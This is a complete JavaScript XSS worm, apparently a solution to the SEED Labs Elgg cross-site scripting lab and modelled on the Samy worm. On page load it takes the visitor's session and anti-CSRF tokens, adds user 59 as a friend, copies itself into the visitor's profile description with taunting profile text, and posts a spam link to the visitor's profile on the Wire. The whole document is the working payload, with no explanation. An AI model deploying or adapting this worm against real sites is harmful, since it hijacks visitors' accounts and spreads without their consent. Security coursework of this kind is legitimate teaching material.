<script id="worm" type="text/javascript">
    window.onload = function () {   
        // First part: Send Samy a friend request from the visitor's account
        var ts = elgg.security.token.__elgg_ts; // Time Stamp
        var token= elgg.security.token.__elgg_token; // Security Token
        var userName = elgg.session.user.name;
        var guid = elgg.session.user.guid;
        var SamyID = 59;
        if (guid == SamyID) return; // no attack if Samy is the visitor
        var sendurl = `/action/friends/add?friend=${SamyID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;        
        //Create and send Ajax request to add friend
        var Ajax1 = new XMLHttpRequest();
        Ajax1.open("GET", sendurl, true); // last boolean value is for asynchronous request making
        Ajax1.setRequestHeader("Host", "www.seed-server.com");
        Ajax1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax1.send();

        // Second part: Modify the visitor's profile
	    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	    var jsCode = document.getElementById("worm").innerHTML;
	    var tailTag = "</" + "script>";
	    var wormCode = headerTag + jsCode + tailTag;
        var sendurl = "/action/profile/edit";

        var formData = new FormData();
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('name', userName);
        formData.append('description', wormCode);
        formData.append('accesslevel[description]', '1');
        formData.append('briefdescription', 'I am Samy, the worm. Catch me if you can.');
        formData.append('accesslevel[briefdescription]', '1');
        formData.append('location', 'Pyongyang');
        formData.append('accesslevel[location]', '1');
        formData.append('interests', 'Hacking, XSS, Worms, CSRF, and so on.');
        formData.append('accesslevel[interests]', '1');
        formData.append('skills', 'I can write a worm in 5 minutes. Can you?');
        formData.append('accesslevel[skills]', '1');
        formData.append('contactemail', 'catchmeifyoucan@yahoo.com');
        formData.append('accesslevel[contactemail]', '1');
        formData.append('phone', '9557134');
        formData.append('accesslevel[phone]', '1');
        formData.append('mobile', '01234567890');
        formData.append('accesslevel[mobile]', '1');
        formData.append('website', 'www.samy-worm.com');
        formData.append('accesslevel[website]', '1');
        formData.append('twitter', 'elonmusk');
        formData.append('accesslevel[twitter]', '1');
        formData.append('guid', guid);
        var Ajax2 = new XMLHttpRequest();
        Ajax2.open("POST", sendurl, true);
        Ajax2.setRequestHeader("Host", "www.seed-server.com");
        Ajax2.send(formData);


        // Third Part: Post the profile link of the visitor on Wire
        var sendurl = "/action/thewire/add";
        var postBody = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/" + userName;
        var formData = new FormData();
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('body', postBody);
        var Ajax3 = new XMLHttpRequest();
        Ajax3.open("POST", sendurl, true);
        Ajax3.setRequestHeader("Host", "www.seed-server.com");
        Ajax3.send(formData);
	}
</script>